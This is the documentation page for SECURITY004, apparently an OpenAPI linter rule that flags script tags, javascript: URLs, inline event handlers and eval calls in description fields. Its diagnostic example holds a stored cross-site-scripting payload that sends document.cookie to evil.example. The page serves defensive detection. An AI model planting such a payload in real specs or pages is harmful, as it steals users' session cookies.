---
id: SECURITY004
category: Security
matcher: markdown-safety
scope: api
---

# SECURITY004 — Description contains active markup

## Intent

OpenAPI `description` and `summary` fields are CommonMark, and most API
portals — including Areté's own spec viewer — render them to HTML. A
description that carries a `<script>` tag, a `javascript:` URL, an inline
event handler, or an `eval(` call is a stored cross-site-scripting payload
waiting for a renderer that does not sanitise. Even where the renderer is
careful today, the spec should not ship the payload.

## Detection and scope

The rule has `api` scope and uses the `markdown-safety` matcher. Every
`description` and `summary` string in the document is scanned for:

- a `<script>` opening or closing tag,
- a `javascript:` URL,
- an inline event-handler attribute (`onload=`, `onerror=`, `onclick=`,
  `onmouseover=`, `onfocus=`, `onsubmit=`),
- an `eval(` call.

Each offending field is reported once, at its pointer.

## Diagnostic

```yaml
info:
  title: Reporting API
  version: 1.0.0
  description: |
    Usage notes. <script>fetch('https://evil.example/'+document.cookie)</script>
```

The `info.description` is reported.

## Compliant

```yaml
info:
  title: Reporting API
  version: 1.0.0
  description: |
    Usage notes. See the [authentication guide](https://docs.example.com/auth).
```

## Configuration and limitations

The rule takes no parameters. It is a defence-in-depth check, not a full HTML
sanitiser: it matches a fixed set of high-signal patterns and will not catch
every possible injection vector (e.g. obfuscated data URIs). It scans
`description` and `summary` only — not `title`, schema `example` values, or
external documentation URLs.
